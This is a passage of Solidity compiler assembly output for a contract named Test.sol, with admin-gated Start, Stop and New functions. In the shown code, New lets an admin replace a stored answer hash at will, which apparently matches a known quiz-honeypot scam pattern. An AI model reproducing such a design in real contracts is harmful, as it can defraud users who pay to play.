responseHash = 0x0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Test.sol\":710:845  function Stop() public payable isAdmin {... */\n      jump\t// out\n        /* \"contracts/Test.sol\":470:704  function Start(string calldata _question, string calldata _response) public payable isAdmin{... */\n    tag_25:\n        /* \"contracts/Test.sol\":1215:1220  admin */\n      0x02\n        /* \"contracts/Test.sol\":1215:1261  admin[keccak256(abi.encodePacked(msg.sender))] */\n      0x00\n        /* \"contracts/Test.sol\":1248:1258  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":1231:1259  abi.encodePacked(msg.sender) */\n      add(0x20, mload(0x40))\n      tag_51\n      swap2\n      swap1\n      tag_45\n      jump\t// in\n    tag_51:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"contracts/Test.sol\":1221:1260  keccak256(abi.encodePacked(msg.sender)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"contracts/Test.sol\":1215:1261  admin[keccak256(abi.encodePacked(msg.sender))] */\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Test.sol\":1207:1262  require(admin[keccak256(abi.encodePacked(msg.sender))]) */\n      tag_52\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_52:\n        /* \"contracts/Test.sol\":588:591  0x0 */\n      0x00\n        /* \"contracts/Test.sol\":574:591  responseHash==0x0 */\n      dup1\n      shl\n        /* \"contracts/Test.sol\":574:586  responseHash */\n      sload(0x01)\n        /* \"contracts/Test.sol\":574:591  responseHash==0x0 */\n      eq\n        /* \"contracts/Test.sol\":571:698  if(responseHash==0x0){... */\n      iszero\n      tag_54\n      jumpi\n        /* \"contracts/Test.sol\":642:651  _response */\n      dup2\n      dup2\n        /* \"contracts/Test.sol\":631:652  abi.encode(_response) */\n      add(0x20, mload(0x40))\n      tag_55\n      swap3\n      swap2\n      swap1\n      tag_56\n      jump\t// in\n    tag_55:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"contracts/Test.sol\":621:653  keccak256(abi.encode(_response)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"contracts/Test.sol\":606:618  responseHash */\n      0x01\n        /* \"contracts/Test.sol\":606:653  responseHash = keccak256(abi.encode(_response)) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Test.sol\":678:687  _question */\n      dup4\n      dup4\n        /* \"contracts/Test.sol\":667:675  question */\n      0x00\n        /* \"contracts/Test.sol\":667:687  question = _question */\n      swap2\n      swap1\n      tag_57\n      swap3\n      swap2\n      swap1\n      tag_58\n      jump\t// in\n    tag_57:\n      pop\n        /* \"contracts/Test.sol\":571:698  if(responseHash==0x0){... */\n    tag_54:\n        /* \"contracts/Test.sol\":470:704  function Start(string calldata _question, string calldata _response) public payable isAdmin{... */\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Test.sol\":851:1012  function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {... */\n    tag_29:\n        /* \"contracts/Test.sol\":1215:1220  admin */\n      0x02\n        /* \"contracts/Test.sol\":1215:1261  admin[keccak256(abi.encodePacked(msg.sender))] */\n      0x00\n        /* \"contracts/Test.sol\":1248:1258  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":1231:1259  abi.encodePacked(msg.sender) */\n      add(0x20, mload(0x40))\n      tag_60\n      swap2\n      swap1\n      tag_45\n      jump\t// in\n    tag_60:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"contracts/Test.sol\":1221:1260  keccak256(abi.encodePacked(msg.sender)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"contracts/Test.sol\":1215:1261  admin[keccak256(abi.encodePacked(msg.sender))] */\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Test.sol\":1207:1262  require(admin[keccak256(abi.encodePacked(msg.sender))]) */\n      tag_61\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_61:\n        /* \"contracts/Test.sol\":958:967  _question */\n      dup3\n      dup3\n        /* \"contracts/Test.sol\":947:955  question */\n      0x00\n        /* \"contracts/Test.sol\":947:967  question = _question */\n      swap2\n      swap1\n      tag_63\n      swap3\n      swap2\n      swap1\n      tag_58\n      jump\t// in\n    tag_63:\n      pop\n        /* \"contracts/Test.sol\":992:1005  _responseHash */\n      dup1\n        /* \"contracts/Test.sol\":977:989  responseHash */\n      0x01\n        /* \"contracts/Test.sol\":977:1005  responseHash = _responseHash */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Test.sol\":851:1012  function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {... */\n      pop\n      pop\n      pop\n      jump\t// out\n    tag_58:\n      dup3\n      dup1\n      sload\n      tag_64\n      swap1\n      tag_38\n      jump\t// in\n    tag_64:\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n      0x1f\n      add\n      0x20\n      swap1\n      div\n      dup2\n      add\n      swap3\n      dup3\n      tag_66\n      jumpi\n      0x00\n      dup6\n      sstore\n      jump(tag_65)\n    tag_66:\n      dup3\n      0x1f\n      lt\n      tag_67\n      jumpi\n      dup1\n      calldataload\n      not(0xff)\n      and\n      dup4\n      dup1\n      add\n      or\n      dup6\n      sstore\n      jump(tag_65)\n    tag_67:\n      dup3\n      dup1\n      add\n      0x01\n      add\n      dup6\n      sstore\n      dup3\n      iszero\n      tag_65\n      jumpi\n      swap2\n      dup3\n      add\n    tag_68:\n      dup3\n      dup2\n      gt\n      iszero\n      tag_69\n      jumpi\n      dup3\n      calldataload\n      dup3\n      sstore\n      swap2\n      0x20\n      add\n      swap2\n      swap1\n      0x01\n      add\n      swap1\n      jump(tag_68)\n    tag_69:\n    tag_65:\n      pop\n      swap1\n      pop\n      tag_70\n      swap2\n      swap1\n      tag_71\n      jump\t// in\n    tag_70:\n      pop\n      swap1\n      jump\t// out\n    tag_71:\n    tag_72:\n      dup1\n      dup3\n      gt\n      iszero\n      tag_73\n      jumpi\n      0x00\n      dup2\n      0x00\n      swap1\n      sstore\n      pop\n      0x01\n      add\n      jump(tag_72)\n    tag_73:\n      pop\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:82   */\n    tag_74:\n        /* \"#utility.yul\":40:46   */\n      0x00\n        /* \"#utility.yul\":73:75   */\n      0x40\n        /* \"#utility.yul\":67:76   */\n      mload\n        /* \"#utility.yul\":57:76   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:82   */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_75:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":211:328   */\n    tag_76:\n        /* \"#utility.yul\":320:321   */\n      0x00\n        /* \"#utility.yul\":317:318   */\n      dup1\n        /* \"#utility.yul\":310:322   */\n      revert\n        /* \"#utility.yul\":334:451   */\n    tag_77:\n        /* \"#utility.yul\":443:444   */\n      0x00\n        /* \"#utility.yul\":440:441   */\n      dup1\n        /* \"#utility.yul\":433:445   */\n      revert\n        /* \"#utility.yul\":457:574   */\n    tag_78:\n        /* \"#utility.yul\":566:567   */\n      0x00\n        /* \"#utility.yul\":563:564   */\n      dup1\n        /* \"#utility.yul\":556:568   */\n      revert\n        /* \"#utility.yul\":580:682   */\n    tag_79:\n        /* \"#utility.yul\":621:627   */\n      0x00\n        /* \"#utility.yul\":672:674   */\n      0x1f\n        /* \"#utility.yul\":668:675   */\n      not\n        /* \"#utility.yul\":663:665   */\n      0x1f\n        /* \"#utility.yul\":656:661   */\n      dup4\n        /* \"#utility.yul\":652:666   */\n      add\n        /* \"#utility.yul\":648:676   */\n      and\n        /* \"#utility.yul\":638:676   */\n      swap1\n      pop\n        /* \"#utility.yul\":580:682   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":688:868   */\n    tag_80:\n        /* \"#utility.yul\":736:813   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":733:734   */\n      0x00\n        /* \"#utility.yul\":726:814   */\n      mstore\n        /* \"#utility.yul\":833:837   */\n      0x41\n        /* \"#utility.yul\":830:831   */\n      0x04\n        /* \"#utility.yul\":823:838   */\n      mstore\n        /* \"#utility.yul\":857:861   */\n      0x24\n        /* \"#utility.yul\":854:855   */\n      0x00\n        /* \"#utility.yul\":847:862   */\n      revert\n        /* \"#utility.yul\":874:1155   */\n    tag_81:\n        /* \"#utility.yul\":957:984   */\n      tag_114\n        /* \"#utility.yul\":979:983   */\n      dup3\n        /* \"#utility.yul\":957:984   */\n      tag_79\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":949:955   */\n      dup2\n        /* \"#utility.yul\":945:985   */\n      add\n        /* \"#utility.yul\":1087:1093   */\n      dup2\n        /* \"#utility.yul\":1075:1085   */\n      dup2\n        /* \"#utility.yul\":1072:1094   */\n      lt\n        /* \"#utility.yul\":1051:1069   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":1039:1049   */\n      dup3\n        /* \"#utility.yul\":1036:1070   */\n      gt\n        /* \"#utility.yul\":1033:1095   */\n      or\n        /* \"#utility.yul\":1030:1118   */\n      iszero\n      tag_115\n      jumpi\n        /* \"#utility.yul\":1098:1116   */\n      tag_116\n      tag_80\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":1030:1118   */\n    tag_115:\n        /* \"#utility.yul\":1138:1148   */\n      dup1\n        /* \"#utility.yul\":1134:1136   */\n      0x40\n        /* \"#utility.yul\":1127:1149   */\n      mstore\n        /* \"#utility.yul\":917:1155   */\n      pop\n        /* \"#utility.yul\":874:1155   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1161:1290   */\n    tag_82:\n        /* \"#utility.yul\":1195:1201   */\n      0x00\n        /* \"#utility.yul\":1222:1242   */\n      tag_118\n      tag_74\n      jump\t// in\n    tag_118:\n        /* \"#utility.yul\":1212:1242   */\n      swap1\n      pop\n        /* \"#utility.yul\":1251:1284   */\n      tag_119\n        /* \"#utility.yul\":1279:1283   */\n      dup3\n        /* \"#utility.yul\":1271:1277   */\n      dup3\n        /* \"#utility.yul\":1251:1284   */\n      tag_81\n      jump\t// in\n    tag_119:\n        /* \"#utility.yul\":1161:1290   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1296:1604   */\n    tag_83:\n        /* \"#utility.yul\":1358:1362   */\n      0x00\n        /* \"#utility.yul\":1448:1466   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":1440:1446   */\n      dup3\n        /* \"#utility.yul\":1437:1467   */\n      gt\n        /* \"#utility.yul\":1434:1490   */\n      iszero\n      tag_121\n      jumpi\n        /* \"#utility.yul\":1470:1488   */\n      tag_122\n      tag_80\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":1434:1490   */\n    tag_121:\n        /* \"#utility.yul\":1508:1537   */\n      tag_123\n        /* \"#utility.yul\":1530:1536   */\n      dup3\n        /* \"#utility.yul\":1508:1537   */\n      tag_79\n      jump\t// in\n    tag_123:\n        /* \"#utility.yul\":1500:1537   */\n      swap1\n      pop\n        /* \"#utility.yul\":1592:1596   */\n      0x20\n        /* \"#utility.yul\":1586:1590   */\n      dup2\n        /* \"#utility.yul\":1582:1597   */\n      add\n        /* \"#utility.yul\":1574:1597   */\n      swap1\n      pop\n        /* \"#utility.yul\":1296:1604   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1610:1764   */\n    tag_84:\n        /* \"#utility.yul\":1694:1700   */\n      dup3\n        /* \"#utility.yul\":1689:1692   */\n      dup2\n        /* \"#utility.yul\":1684:1687   */\n      dup4\n        /* \"#utility.yul\":1671:1701   */\n      calldatacopy\n        /* \"#utility.yul\":1756:1757   */\n      0x00\n        /* \"#utility.yul\":1747:1753   */\n      dup4\n        /* \"#utility.yul\":1742:1745   */\n      dup4\n        /* \"#utility.yul\":1738:1754   */\n      add\n        /* \"#utility.yul\":1731:1758   */\n      mstore\n        /* \"#utility.yul\":1610:1764   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1770:2182   */\n    tag_85:\n        /* \"#utility.yul\":1848:1853   */\n      0x00\n        /* \"#utility.yul\":1873:1939   */\n      tag_126\n        /* \"#utility.yul\":1889:1938   */\n      tag_127\n        /* \"#utility.yul\":1931:1937   */\n      dup5\n        /* \"#utility.yul\":1889:1938   */\n      tag_83\n      jump\t// in\n    tag_127:\n        /* \"#utility.yul\":1873:1939   */\n      tag_82\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":1864:1939   */\n      swap1\n      pop\n        /* \"#utility.yul\":1962:1968   */\n      dup3\n        /* \"#utility.yul\":1955:1960   */\n      dup2\n        /* \"#utility.yul\":1948:1969   */\n      mstore\n        /* \"#utility.yul\":2000:2004   */\n      0x20\n        /* \"#utility.yul\":1993:1998   */\n      dup2\n        /* \"#utility.yul\":1989:2005   */\n      add\n        /* \"#utility.yul\":2038:2041   */\n      dup5\n        /* \"#utility.yul\":2029:2035   */\n      dup5\n        /* \"#utility.yul\":2024:2027   */\n      dup5\n        /* \"#utility.yul\":2020:2036   */\n      add\n        /* \"#utility.yul\":2017:2042   */\n      gt\n        /* \"#utility.yul\":2014:2126   */\n      iszero\n      tag_128\n      jumpi\n        /* \"#utility.yul\":2045:2124   */\n      tag_129\n      tag_78\n      jump\t// in\n    tag_129:\n        /* \"#utility.yul\":2014:2126   */\n    tag_128:\n        /* \"#utility.yul\":2135:2176   */\n      tag_130\n        /* \"#utility.yul\":2169:2175   */\n      dup5\n        /* \"#utility.yul\":2164:2167   */\n      dup3\n        /* \"#utility.yul\":2159:2162   */\n      dup6\n        /* \"#utility.yul\":2135:2176   */\n      tag_84\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":1854:2182   */\n      pop\n        /* \"#utility.yul\":1770:2182   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2202:2542   */\n    tag_86:\n        /* \"#utility.yul\":2258:2263   */\n      0x00\n        /* \"#utility.yul\":2307:2310   */\n      dup3\n        /* \"#utility.yul\":2300:2304   */\n      0x1f\n        /* \"#utility.yul\":2292:2298   */\n      dup4\n        /* \"#utility.yul\":2288:2305   */\n      add\n        /* \"#utility.yul\":2284:2311   */\n      slt\n        /* \"#utility.yul\":2274:2396   */\n      tag_132\n      jumpi\n        /* \"#utility.yul\":2315:2394   */\n      tag_133\n      tag_77\n      jump\t// in\n    tag_133:\n        /* \"#utility.yul\":2274:2396   */\n    tag_132:\n        /* \"#utility.yul\":2432:2438   */\n      dup2\n        /* \"#utility.yul\":2419:2439   */\n      calldataload\n        /* \"#utility.yul\":2457:2536   */\n      tag_134\n        /* \"#utility.yul\":2532:2535   */\n      dup5\n        /* \"#utility.yul\":2524:2530   */\n      dup3\n        /* \"#utility.yul\":2517:2521   */\n      0x20\n        /* \"#utility.yul\":2509:2515   */\n      dup7\n        /* \"#utility.yul\":2505:2522   */\n      add\n        /* \"#utility.yul\":2457:2536   */\n      tag_85\n      jump\t// in\n    tag_134:\n        /* \"#utility.yul\":2448:2536   */\n      swap2\n      pop\n        /* \"#utility.yul\":2264:2542   */\n      pop\n        /* \"#utility.yul\":2202:2542   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2548:3057   */\n    tag_13:\n        /* \"#utility.yul\":2617:2623   */\n      0x00\n        /* \"#utility.yul\":2666:2668   */\n      0x20\n        /* \"#utility.yul\":2654:2663   */\n      dup3\n        /* \"#utility.yul\":2645:2652   */\n      dup5\n        /* \"#utility.yul\":2641:2664   */\n      sub\n        /* \"#utility.yul\":2637:2669   */\n      slt\n        /* \"#utility.yul\":2634:2753   */\n      iszero\n      tag_136\n      jumpi\n        /* \"#utility.yul\":2672:2751   */\n      tag_137\n      tag_75\n      jump\t// in\n    tag_137:\n        /* \"#utility.yul\":2634:2753   */\n    tag_136:\n        /* \"#utility.yul\":2820:2821   */\n      0x00\n        /* \"#utility.yul\":2809:2818   */\n      dup3\n        /* \"#utility.yul\":2805:2822   */\n      add\n        /* \"#utility.yul\":2792:2823   */\n      calldataload\n        /* \"#utility.yul\":2850:2868   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":2842:2848   */\n      dup2\n        /* \"#utility.yul\":2839:2869   */\n      gt\n        /* \"#utility.yul\":2836:2953   */\n      iszero\n      tag_138\n      jumpi\n        /* \"#utility.yul\":2872:2951   */\n      tag_139\n      tag_76\n      jump\t// in\n    tag_139:\n        /* \"#utility.yul\":2836:2953   */\n    tag_138:\n        /* \"#utility.yul\":2977:3040   */\n      tag_140\n        /* \"#utility.yul\":3032:3039   */\n      dup5\n        /* \"#utility.yul\":3023:3029   */\n      dup3\n        /* \"#utility.yul\":3012:3021   */\n      dup6\n        /* \"#utility.yul\":3008:3030   */\n      add\n        /* \"#utility.yul\":2977:3040   */\n      tag_86\n      jump\t// in\n    tag_140:\n        /* \"#utility.yul\":2967:3040   */\n      swap2\n      pop\n        /* \"#utility.yul\":2763:3050   */\n      pop\n        /* \"#utility.yul\":2548:3057   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3063:3162   */\n    tag_87:\n        /* \"#utility.yul\":3115:3121   */\n      0x00\n        /* \"#utility.yul\":3149:3154   */\n      dup2\n        /* \"#utility.yul\":3143:3155   */\n      mload\n        /* \"#utility.yul\":3133:3155   */\n      swap1\n      pop\n        /* \"#utility.yul\":3063:3162   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3168:3337   */\n    tag_88:\n        /* \"#utility.yul\":3252:3263   */\n      0x00\n        /* \"#utility.yul\":3286:3292   */\n      dup3\n        /* \"#utility.yul\":3281:3284   */\n      dup3\n        /* \"#utility.yul\":3274:3293   */\n      mstore\n        /* \"#utility.yul\":3326:3330   */\n      0x20\n        /* \"#utility.yul\":3321:3324   */\n      dup3\n        /* \"#utility.yul\":3317:3331   */\n      add\n        /* \"#utility.yul\":3302:3331   */\n      swap1\n      pop\n        /* \"#utility.yul\":3168:3337   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3343:3650   */\n    tag_89:\n        /* \"#utility.yul\":3411:3412   */\n      0x00\n        /* \"#utility.yul\":3421:3534   */\n    tag_144:\n        /* \"#utility.yul\":3435:3441   */\n      dup4\n        /* \"#utility.yul\":3432:3433   */\n      dup2\n        /* \"#utility.yul\":3429:3442   */\n      lt\n        /* \"#utility.yul\":3421:3534   */\n      iszero\n      tag_146\n      jumpi\n        /* \"#utility.yul\":3520:3521   */\n      dup1\n        /* \"#utility.yul\":3515:3518   */\n      dup3\n        /* \"#utility.yul\":3511:3522   */\n      add\n        /* \"#utility.yul\":3505:3523   */\n      mload\n        /* \"#utility.yul\":3501:3502   */\n      dup2\n        /* \"#utility.yul\":3496:3499   */\n      dup5\n        /* \"#utility.yul\":3492:3503   */\n      add\n        /* \"#utility.yul\":3485:3524   */\n      mstore\n        /* \"#utility.yul\":3457:3459   */\n      0x20\n        /* \"#utility.yul\":3454:3455   */\n      dup2\n        /* \"#utility.yul\":3450:3460   */\n      add\n        /* \"#utility.yul\":3445:3460   */\n      swap1\n      pop\n        /* \"#utility.yul\":3421:3534   */\n      jump(tag_144)\n    tag_146:\n        /* \"#utility.yul\":3552:3558   */\n      dup4\n        /* \"#utility.yul\":3549:3550   */\n      dup2\n        /* \"#utility.yul\":3546:3559   */\n      gt\n        /* \"#utility.yul\":3543:3644   */\n      iszero\n      tag_147\n      jumpi\n        /* \"#utility.yul\":3632:3633   */\n      0x00\n        /* \"#utility.yul\":3623:3629   */\n      dup5\n        /* \"#utility.yul\":3618:3621   */\n      dup5\n        /* \"#utility.yul\":3614:3630   */\n      add\n        /* \"#utility.yul\":3607:3634   */\n      mstore\n        /* \"#utility.yul\":3543:3644   */\n    tag_147:\n        /* \"#utility.yul\":3392:3650   */\n      pop\n        /* \"#utility.yul\":3343:3650   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3656:4020   */\n    tag_90:\n        /* \"#utility.yul\":3744:3747   */\n      0x00\n        /* \"#utility.yul\":3772:3811   */\n      tag_149\n        /* \"#utility.yul\":3805:3810   */\n      dup3\n        /* \"#utility.yul\":3772:3811   */\n      tag_87\n      jump\t// in\n    tag_149:\n        /* \"#utility.yul\":3827:3898   */\n      tag_150\n        /* \"#utility.yul\":3891:3897   */\n      dup2\n        /* \"#utility.yul\":3886:3889   */\n      dup6\n        /* \"#utility.yul\":3827:3898   */\n      tag_88\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":3820:3898   */\n      swap4\n      pop\n        /* \"#utility.yul\":3907:3959   */\n      tag_151\n        /* \"#utility.yul\":3952:3958   */\n      dup2\n        /* \"#utility.yul\":3947:3950   */\n      dup6\n        /* \"#utility.yul\":3940:3944   */\n      0x20\n        /* \"#utility.yul\":3933:3938   */\n      dup7\n        /* \"#utility.yul\":3929:3945   */\n      add\n        /* \"#utility.yul\":3907:3959   */\n      tag_89\n      jump\t// in\n    tag_151:\n        /* \"#utility.yul\":3984:4013   */\n      tag_152\n        /* \"#utility.yul\":4006:4012   */\n      dup2\n        /* \"#utility.yul\":3984:4013   */\n      tag_79\n      jump\t// in\n    tag_152:\n        /* \"#utility.yul\":3979:3982   */\n      dup5\n        /* \"#utility.yul\":3975:4014   */\n      add\n        /* \"#utility.yul\":3968:4014   */\n      swap2\n      pop\n        /* \"#utility.yul\":3748:4020   */\n      pop\n        /* \"#utility.yul\":3656:4020   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4026:4339   */\n    tag_19:\n        /* \"#utility.yul\":4139:4143   */\n      0x00\n        /* \"#utility.yul\":4177:4179   */\n      0x20\n        /* \"#utility.yul\":4166:4175   */\n      dup3\n        /* \"#utility.yul\":4162:4180   */\n      add\n        /* \"#utility.yul\":4154:4180   */\n      swap1\n      pop\n        /* \"#utility.yul\":4226:4235   */\n      dup2\n        /* \"#utility.yul\":4220:4224   */\n      dup2\n        /* \"#utility.yul\":4216:4236   */\n      sub\n        /* \"#utility.yul\":4212:4213   */\n      0x00\n        /* \"#utility.yul\":4201:4210   */\n      dup4\n        /* \"#utility.yul\":4197:4214   */\n      add\n        /* \"#utility.yul\":4190:4237   */\n      mstore\n        /* \"#utility.yul\":4254:4332   */\n      tag_154\n        /* \"#utility.yul\":4327:4331   */\n      dup2\n        /* \"#utility.yul\":4318:4324   */\n      dup5\n        /* \"#utility.yul\":4254:4332   */\n      tag_90\n      jump\t// in\n    tag_154:\n        /* \"#utility.yul\":4246:4332   */\n      swap1\n      pop\n        /* \"#utility.yul\":4026:4339   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4345:4462   */\n    tag_91:\n        /* \"#utility.yul\":4454:4455   */\n      0x00\n        /* \"#utility.yul\":4451:4452   */\n      dup1\n        /* \"#utility.yul\":4444:4456   */\n      revert\n        /* \"#utility.yul\":4468:4585   */\n    tag_92:\n        /* \"#utility.yul\":4577:4578   */\n      0x00\n        /* \"#utility.yul\":4574:4575   */\n      dup1\n        /* \"#utility.yul\":4567:4579   */\n      revert\n        /* \"#utility.yul\":4605:5158   */\n    tag_93:\n        /* \"#utility.yul\":4663:4671   */\n      0x00\n        /* \"#utility.yul\":4673:4679   */\n      dup1\n        /* \"#utility.yul\":4723:4726   */\n      dup4\n        /* \"#utility.yul\":4716:4720   */\n      0x1f\n        /* \"#utility.yul\":4708:4714   */\n      dup5\n        /* \"#utility.yul\":4704:4721   */\n      add\n        /* \"#utility.yul\":4700:4727   */\n      slt\n        /* \"#utility.yul\":4690:4812   */\n      tag_158\n      jumpi\n        /* \"#utility.yul\":4731:4810   */\n      tag_159\n      tag_77\n      jump\t// in\n    tag_159:\n        /* \"#utility.yul\":4690:4812   */\n    tag_158:\n        /* \"#utility.yul\":4844:4850   */\n      dup3\n        /* \"#utility.yul\":4831:4851   */\n      calldataload\n        /* \"#utility.yul\":4821:4851   */\n      swap1\n      pop\n        /* \"#utility.yul\":4874:4892   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":4866:4872   */\n      dup2\n        /* \"#utility.yul\":4863:4893   */\n      gt\n        /* \"#utility.yul\":4860:4977   */\n      iszero\n      tag_160\n      jumpi\n        /* \"#utility.yul\":4896:4975   */\n      tag_161\n      tag_91\n      jump\t// in\n    tag_161:\n        /* \"#utility.yul\":4860:4977   */\n    tag_160:\n        /* \"#utility.yul\":5010:5014   */\n      0x20\n        /* \"#utility.yul\":5002:5008   */\n      dup4\n        /* \"#utility.yul\":4998:5015   */\n      add\n        /* \"#utility.yul\":4986:5015   */\n      swap2\n      pop\n        /* \"#utility.yul\":5064:5067   */\n      dup4\n        /* \"#utility.yul\":5056:5060   */\n      0x01\n        /* \"#utility.yul\":5048:5054   */\n      dup3\n        /* \"#utility.yul\":5044:5061   */\n      mul\n        /* \"#utility.yul\":5034:5042   */\n      dup4\n        /* \"#utility.yul\":5030:5062   */\n      add\n        /* \"#utility.yul\":5027:5068   */\n      gt\n        /* \"#utility.yul\":5024:5152   */\n      iszero\n      tag_162\n      jumpi\n        /* \"#utility.yul\":5071:5150   */\n      tag_163\n      tag_92\n      jump\t// in\n    tag_163:\n        /* \"#utility.yul\":5024:5152   */\n    tag_162:\n        /* \"#utility.yul\":4605:5158   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5164:6038   */\n    tag_24:\n        /* \"#utility.yul\":5256:5262   */\n      0x00\n        /* \"#utility.yul\":5264:5270   */\n      dup1\n        /* \"#utility.yul\":5272:5278   */\n      0x00\n        /* \"#utility.yul\":5280:5286   */\n      dup1\n        /* \"#utility.yul\":5329:5331   */\n      0x40\n        /* \"#utility.yul\":5317:5326   */\n      dup6\n        /* \"#utility.yul\":5308:5315   */\n      dup8\n        /* \"#utility.yul\":5304:5327   */\n      sub\n        /* \"#utility.yul\":5300:5332   */\n      slt\n        /* \"#utility.yul\":5297:5416   */\n      iszero\n      tag_165\n      jumpi\n        /* \"#utility.yul\":5335:5414   */\n      tag_166\n      tag_75\n      jump\t// in\n    tag_166:\n        /* \"#utility.yul\":5297:5416   */\n    tag_165:\n        /* \"#utility.yul\":5483:5484   */\n      0x00\n        /* \"#utility.yul\":5472:5481   */\n      dup6\n        /* \"#utility.yul\":5468:5485   */\n      add\n        /* \"#utility.yul\":5455:5486   */\n      calldataload\n        /* \"#utility.yul\":5513:5531   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":5505:5511   */\n      dup2\n        /* \"#utility.yul\":5502:5532   */\n      gt\n        /* \"#utility.yul\":5499:5616   */\n      iszero\n      tag_167\n      jumpi\n        /* \"#utility.yul\":5535:5614   */\n      tag_168\n      tag_76\n      jump\t// in\n    tag_168:\n        /* \"#utility.yul\":5499:5616   */\n    tag_167:\n        /* \"#utility.yul\":5648:5713   */\n      tag_169\n        /* \"#utility.yul\":5705:5712   */\n      dup8\n        /* \"#utility.yul\":5696:5702   */\n      dup3\n        /* \"#utility.yul\":5685:5694   */\n      dup9\n        /* \"#utility.yul\":5681:5703   */\n      add\n        /* \"#utility.yul\":5648:5713   */\n      tag_93\n      jump\t// in\n    tag_169:\n        /* \"#utility.yul\":5630:5713   */\n      swap5\n      pop\n      swap5\n      pop\n        /* \"#utility.yul\":5426:5723   */\n      pop\n        /* \"#utility.yul\":5790:5792   */\n      0x20\n        /* \"#utility.yul\":5779:5788   */\n      dup6\n        /* \"#utility.yul\":5775:5793   */\n      add\n        /* \"#utility.yul\":5762:5794   */\n      calldataload\n        /* \"#utility.yul\":5821:5839   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":5813:5819   */\n      dup2\n        /* \"#utility.yul\":5810:5840   */\n      gt\n        /* \"#utility.yul\":5807:5924   */\n      iszero\n      tag_170\n      jumpi\n        /* \"#utility.yul\":5843:5922   */\n      tag_171\n      tag_76\n      jump\t// in\n    tag_171:\n        /* \"#utility.yul\":5807:5924   */\n    tag_170:\n        /* \"#utility.yul\":5956:6021   */\n      tag_172\n        /* \"#utility.yul\":6013:6020   */\n      dup8\n        /* \"#utility.yul\":6004:6010   */\n      dup3\n        /* \"#utility.yul\":5993:6002   */\n      dup9\n        /* \"#utility.yul\":5989:6011   */\n      add\n        /* \"#utility.yul\":5956:6021   */\n      tag_93\n      jump\t// in\n    tag_172:\n        /* \"#utility.yul\":5938:6021   */\n      swap3\n      pop\n      swap3\n      pop\n        /* \"#utility.yul\":5733:6031   */\n      pop\n        /* \"#utility.yul\":5164:6038   */\n      swap3\n      swap6\n      swap2\n      swap5\n      pop\n      swap3\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6044:6121   */\n    tag_94:\n        /* \"#utility.yul\":6081:6088   */\n      0x00\n        /* \"#utility.yul\":6110:6115   */\n      dup2\n        /* 